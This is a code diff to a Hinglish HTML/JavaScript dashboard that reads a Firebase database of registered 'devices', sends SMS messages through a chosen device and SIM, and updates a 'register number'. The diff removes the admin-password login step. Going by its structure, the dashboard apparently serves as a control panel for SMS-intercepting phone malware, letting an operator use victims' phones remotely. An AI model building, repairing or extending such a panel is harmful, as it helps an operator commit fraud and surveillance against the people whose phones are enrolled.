@@ -26,13 +26,6 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);mi
 .pbtn{width:100%;background:linear-gradient(135deg,var(--purple),var(--purple2));color:#fff;border:none;border-radius:10px;padding:13px;font-size:15px;font-weight:700;cursor:pointer;margin-top:4px;}
 .pbtn:disabled{opacity:.5;cursor:not-allowed;}
 .errbox{background:#fef2f2;border:1px solid #fecaca;color:#b91c1c;padding:10px 13px;border-radius:8px;font-size:13px;margin-top:10px;display:none;}
-#login-screen{min-height:100vh;display:none;align-items:center;justify-content:center;background:linear-gradient(135deg,#4c1d95,#1e1b4b);}
-.login-card{background:#fff;border-radius:20px;padding:36px 28px;width:100%;max-width:340px;box-shadow:var(--shadow2);text-align:center;}
-.login-card .ic{font-size:44px;}
-.login-card h2{font-size:19px;font-weight:700;color:var(--purple);margin:8px 0 4px;}
-.login-card p{font-size:13px;color:var(--muted);margin-bottom:20px;}
-.login-card input{width:100%;border:1.5px solid var(--border);border-radius:10px;padding:12px;font-size:20px;text-align:center;letter-spacing:5px;outline:none;margin-bottom:14px;}
-.login-card input:focus{border-color:var(--purple2);}
 #app{display:none;flex-direction:column;min-height:100vh;}
 .topbar{background:linear-gradient(135deg,var(--purple),var(--purple2));padding:13px 16px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:200;box-shadow:0 2px 10px rgba(91,33,182,.35);}
 .topbar-title{color:#fff;font-size:16px;font-weight:700;display:flex;align-items:center;gap:8px;}
@@ -51,7 +44,6 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);mi
 .slbl{font-size:11px;color:var(--muted);margin-top:2px;}
 .reg-bar{background:#fff;padding:8px 16px;border-bottom:1px solid var(--border);font-size:13px;color:var(--muted);text-align:center;}
 .upd-btn{display:block;margin:12px 16px;background:linear-gradient(135deg,var(--purple),var(--purple2));color:#fff;border:none;border-radius:10px;padding:14px;font-size:14px;font-weight:700;text-align:center;cursor:pointer;letter-spacing:1px;width:calc(100% - 32px);}
-.refresh-btn{display:block;margin:0 16px 12px;background:#fff;color:var(--purple);border:1.5px solid var(--purple-light);border-radius:10px;padding:10px;font-size:13px;font-weight:600;text-align:center;cursor:pointer;width:calc(100% - 32px);}
 .dev-list{padding:0 16px 80px;}
 .dev-card{background:#fff;border-radius:14px;padding:13px 15px;margin-bottom:10px;box-shadow:var(--shadow);cursor:pointer;transition:transform .15s;}
 .dev-card:active{transform:scale(.98);}
@@ -117,7 +109,7 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);mi
 </style>
 </head>
 <body>
-  <div id="setup-screen">
+<div id="setup-screen">
   <div class="setup-card">
     <div class="setup-logo">
       <div class="ic">📡</div>
@@ -132,18 +124,8 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);mi
       <input id="cfg-pid" placeholder="your-project-id" /></div>
     <div class="fg"><label>Main Node (default: csc6)</label>
       <input id="cfg-node" value="csc6" /></div>
-    <button class="pbtn" id="setup-btn" onclick="doSetup()">🔗 Connect &amp; Login</button>
+    <button class="pbtn" id="setup-btn" onclick="doSetup()">🔗 Connect</button>
     <div class="errbox" id="setup-err"></div>
-  </div>
-</div>
-<div id="login-screen">
-  <div class="login-card">
-    <div class="ic">🔐</div>
-    <h2>Admin Login</h2>
-    <p>Firebase Admin Password daalo</p>
-    <input type="password" id="login-pass" placeholder="••••••" maxlength="20" onkeydown="if(event.key==='Enter')doLogin()" />
-    <button class="pbtn" onclick="doLogin()">Login</button>
-    <div class="errbox" id="login-err"></div>
   </div>
 </div>
 <div id="app">
@@ -234,7 +216,7 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);mi
 <div id="toast"></div>
 <script>
 var DB_URL='', API_KEY='', ROOT_NODE='csc6';
-var DEVICES={}, _adminPass='', currentDeviceKey=null, selectedSim=0, toastTimer=null;
+var DEVICES={}, currentDeviceKey=null, selectedSim=0, toastTimer=null;
 var pollTimer=null, isSearchMode=false;
 function fbGet(path){
   return fetch(DB_URL+'/'+path+'.json?auth='+API_KEY)
@@ -254,44 +236,26 @@ function showToast(msg){
   toastTimer=setTimeout(function(){t.style.opacity='0';},2200);
 }
 function doSetup(){
-  DB_URL = document.getElementById('cfg-url').value.trim().replace(/\/$/,'');
-  API_KEY= document.getElementById('cfg-key').value.trim();
-  var pid = document.getElementById('cfg-pid').value.trim();
+  DB_URL=document.getElementById('cfg-url').value.trim().replace(/\/$/,'');
+  API_KEY=document.getElementById('cfg-key').value.trim();
+  var pid=document.getElementById('cfg-pid').value.trim();
   ROOT_NODE=document.getElementById('cfg-node').value.trim()||'csc6';
   if(!DB_URL||!API_KEY||!pid){showSetupErr('Sab fields zaroori hain!');return;}
   var btn=document.getElementById('setup-btn');
   btn.disabled=true; btn.textContent='Connecting...';
-  fbGet(ROOT_NODE+'/Admin_Password').then(function(val){
-    if(val===null||val===undefined){
-      showSetupErr("'"+ROOT_NODE+"' mein Admin_Password nahi mila. Node name check karo.");
-      btn.disabled=false; btn.textContent='🔗 Connect & Login'; return;
-    }
-    _adminPass=String(val);
+  fbGet(ROOT_NODE+'/All_User').then(function(data){
     document.getElementById('setup-screen').style.display='none';
-    var ls=document.getElementById('login-screen');
-    ls.style.display='flex'; ls.style.flexDirection='column';
-    document.getElementById('login-err').style.display='none';
-    document.getElementById('login-pass').value='';
-    setTimeout(function(){document.getElementById('login-pass').focus();},200);
-  }).catch(function(e){
-    showSetupErr('Connection failed: '+e.message+' — URL/API Key check karo.');
-    btn.disabled=false; btn.textContent='🔗 Connect & Login';
-  });
-}
-function showSetupErr(m){var e=document.getElementById('setup-err');e.textContent=m;e.style.display='block';}
-function doLogin(){
-  var pass=document.getElementById('login-pass').value;
-  if(pass===_adminPass){
-    document.getElementById('login-screen').style.display='none';
     var app=document.getElementById('app');
     app.style.display='flex'; app.style.flexDirection='column';
     loadData();
     startPolling();
-  } else {
-    var e=document.getElementById('login-err');
-    e.textContent='❌ Wrong password!'; e.style.display='block';
-  }
+    showToast('Connected ✅');
+  }).catch(function(e){
+    showSetupErr('Connection failed: '+e.message+' - URL/API Key check karo.');
+    btn.disabled=false; btn.textContent='🔗 Connect';
+  });
 }
+function showSetupErr(m){var e=document.getElementById('setup-err');e.textContent=m;e.style.display='block';}
 function doDisconnect(){
   stopPolling();
   document.getElementById('app').style.display='none';
@@ -299,7 +263,7 @@ function doDisconnect(){
   document.getElementById('search-screen').style.display='none';
   document.getElementById('setup-screen').style.display='flex';
   document.getElementById('setup-btn').disabled=false;
-  document.getElementById('setup-btn').textContent='🔗 Connect & Login';
+  document.getElementById('setup-btn').textContent='🔗 Connect';
   showToast('Logged out');
 }
 function startPolling(){
@@ -587,13 +551,7 @@ function doSendSms(){
   var to=document.getElementById('sms-to').value.trim();
   var msg=document.getElementById('sms-msg').value.trim();
   if(!to||!msg){showToast('Number and message required!');return;}
-  var smsData={
-    To:to,
-    Msg:msg,
-    Time:new Date().toISOString(),
-    Status:'pending',
-    Direction:'outgoing'
-  };
+  var smsData={To:to,Msg:msg,Time:new Date().toISOString(),Status:'pending',Direction:'outgoing'};
   var path=ROOT_NODE+'/All_User/'+currentDeviceKey+'/Sms_Send';
   fbSet(path, smsData).then(function(){
     showToast('SMS sent ✅');
@@ -609,7 +567,7 @@ function openUpdateNo(){
 function doUpdateNo(){
   var num=document.getElementById('update-num').value.trim();
   if(!num){showToast('Number required!');return;}
-  var path=ROOT_NODE+'/All_User/RegisterNo';
+  var path=ROOT_NODE+'/RegisterNo';
   fbSet(path, num).then(function(){
     showToast('Register number updated ✅');
     closeDialog('dlg-update');
@@ -618,16 +576,10 @@ function doUpdateNo(){
     showToast('Update failed ❌ '+e.message);
   });
 }
-function openDialog(id){
-  document.getElementById(id).style.display='flex';
-}
-function closeDialog(id){
-  document.getElementById(id).style.display='none';
-}
+function openDialog(id){document.getElementById(id).style.display='flex';}
+function closeDialog(id){document.getElementById(id).style.display='none';}
 document.querySelectorAll('.overlay').forEach(function(ov){
-  ov.addEventListener('click',function(e){
-    if(e.target===ov) ov.style.display='none';
-  });
+  ov.addEventListener('click',function(e){if(e.target===ov) ov.style.display='none';});
 });
 </script>
 </body>
